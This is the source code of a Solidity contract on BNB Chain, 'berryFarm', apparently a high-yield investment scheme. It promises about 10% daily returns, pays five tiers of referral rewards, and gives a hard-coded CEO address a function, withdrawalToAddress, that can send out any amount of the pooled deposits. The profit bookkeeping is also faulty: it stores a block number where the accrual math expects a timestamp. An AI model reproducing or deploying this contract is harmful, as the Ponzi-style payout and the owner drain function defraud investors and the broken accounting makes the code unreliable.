/**
 *Submitted for verification at BscScan.com on 2022-06-30
*/

// SPDX-License-Identifier: none
pragma solidity ^0.8.11;
/**     
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}



contract Ownable {
  address public CEO; 
  uint public oneDay = 86400; 
  
  
  constructor() {
    CEO = 0xe2C71AF393f8BeCb23dEe715775f4fC407f7e9F6;
  }
  modifier onlyOwner() {
    require(msg.sender == CEO);
    _;
  }
}
contract berryFarm is Ownable {   
   
   struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
    address referer;
   
    uint balanceRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
    bool antiwhale;
    uint firstInvestAt;
  }

  struct InvestorReferral {
  
    uint referralsAmt_tier1;
    uint referralsAmt_tier2;
    uint referralsAmt_tier3;
    uint referralsAmt_tier4;
    uint referralsAmt_tier5;
    uint referrals_tier1;
    uint referrals_tier2;
    uint referrals_tier3;
    uint referrals_tier4;
    uint referrals_tier5;
  }
 
 
  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalWithdrawal;
  uint public berryPricePerBnb = 1200000*(10**18);
  mapping (address => Investor) public investors;
  mapping (address => InvestorReferral) public investorreferrals;
  
  event buyAt(address user,  uint amount);
  event Reinvest(address user, uint amount);
  event Sell(address user, uint amount);
  event TransferOwnership(address user);
  event AntiWhaleUpdate(address user,bool newStatus);
  
  function register(uint amount,address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      investors[msg.sender].antiwhale = true;
      investors[msg.sender].firstInvestAt = block.timestamp;
      
      totalInvestors++;
      
      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;
        rewardReferers(amount, investors[msg.sender].referer);
      }
    }
  }
  
  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;
    uint a = 0;
    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }
      
      if(i==0){
          a = amount * 8 / 100;
          investorreferrals[rec].referralsAmt_tier1 += a;
          investorreferrals[rec].referrals_tier1++;
      }
      else if(i==1){
          
          a = amount * 4 / 100;
          investorreferrals[rec].referralsAmt_tier2 += a;
          investorreferrals[rec].referrals_tier2++;
      }
      else if(i==2){
          
          a = amount * 2 / 100;
          investorreferrals[rec].referralsAmt_tier3 += a;
          investorreferrals[rec].referrals_tier3++;
      }
      else if(i==3){
          
          a = amount * 1 / 100;
          investorreferrals[rec].referralsAmt_tier4 += a;
          investorreferrals[rec].referrals_tier4++;
      }
       else if(i==4){
          
          a = amount * 1 / 100;
          investorreferrals[rec].referralsAmt_tier5 += a;
          investorreferrals[rec].referrals_tier5++;
      }
      
      investors[rec].balanceRef += a;
      rec = investors[rec].referer;
    }
  }
  
  
  constructor() {
    tariffs.push(Tariff(365 * oneDay, 3650));
    
    for (uint i = 5; i >= 1; i--) {
      refRewards.push(i);
    }
  }
  

  
  function Buy(address referer) external payable {
      require(msg.value >= 1000000000);
      uint tariff = 0;
		  
        
	    uint berrryAmt = (msg.value*berryPricePerBnb)/(10**18);
      register(berrryAmt,referer);
      
      
		  investors[msg.sender].invested += berrryAmt;
		  totalInvested += berrryAmt;
		
		  investors[msg.sender].deposits.push(Deposit(tariff, berrryAmt, block.timestamp));

      
		  emit buyAt(msg.sender,  msg.value);
	}

  function calculateBerry(uint amt) public view returns (uint berrryAmt) {
      berrryAmt = (amt*berryPricePerBnb)/(10**18);
  }
  
 function reinvest() external  {
   
	  uint amount = profit();
    require(amount >= 1 );

    investors[msg.sender].deposits.push(Deposit(0, amount, block.timestamp));
    investors[msg.sender].invested += amount;
    totalInvested += amount;
    emit Reinvest(msg.sender,amount);
  } 
  
  
  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];

    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.timestamp > finish ? finish : block.timestamp;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }

  function rewardBnb(address user) public view returns (uint bnbAmt) {
    Investor storage investor = investors[user];
    uint amount = 0;
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.timestamp > finish ? finish : block.timestamp;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
     amount += investor.balanceRef;
    uint withdrawalFee = investor.antiwhale == true ? 3 : 40;
    uint withdrawFeeAmt = amount*withdrawalFee/100;
    uint remaningAmt = amount - withdrawFeeAmt;
    bnbAmt = (remaningAmt*(10**18))/berryPricePerBnb;

  }

  
  function myData() public view returns (uint,uint,uint,uint,uint,uint){
       uint tariff = investors[msg.sender].deposits[0].tariff;
       Investor storage investor = investors[msg.sender];
       uint amount = investor.invested;
       uint balanceRef = investor.balanceRef;
       uint withdrawableRoi = withdrawable(msg.sender);
       uint withdrawableAmt =  withdrawableRoi +balanceRef ;
       uint withdrawn = investor.withdrawn;
       uint totalEarning = withdrawn  + withdrawableAmt +balanceRef ;
       return (tariff,amount,totalEarning,balanceRef,withdrawn,withdrawableAmt);
  }
  
  
  function profit() internal returns (uint) {
     Investor storage investor = investors[msg.sender];
    
     uint amount = withdrawable(msg.sender);
    
     amount += investor.balanceRef;
     investor.balanceRef = 0;
     investor.paidAt = block.number;
    
    return amount;
  }
  
  function sell(address payable addressAt) external {
    require (msg.sender==addressAt,"address should be same");
    uint withdrawalFee = 40;
    if(investors[addressAt].antiwhale == true) {
      uint withdrawnAt  = investors[addressAt].paidAt == 0  ? investors[addressAt].firstInvestAt :  investors[addressAt].paidAt;
      require((block.timestamp - withdrawnAt) > (7*oneDay),"7 days gap Required") ;
      withdrawalFee = 3;
    }
    uint amount = profit();
    uint feeAmount = (amount*withdrawalFee)/100;
    uint withdrawableAmt = amount - feeAmount;
    uint bnbAmt = (withdrawableAmt*(10**18))/berryPricePerBnb;
    require(amount >= 1 );
    if (addressAt.send(bnbAmt)) {
      investors[addressAt].withdrawn += amount;
      totalWithdrawal +=amount;
      emit Sell(msg.sender, bnbAmt);
    }
  }

  function withdrawalToAddress(address payable to,uint amount) external {
        require(msg.sender == CEO);
        to.transfer(amount);
  }


 function changeAntiwhaleStatus(bool newStatus) external {
        investors[msg.sender].antiwhale = newStatus;
        emit AntiWhaleUpdate(msg.sender,newStatus);
  }  
}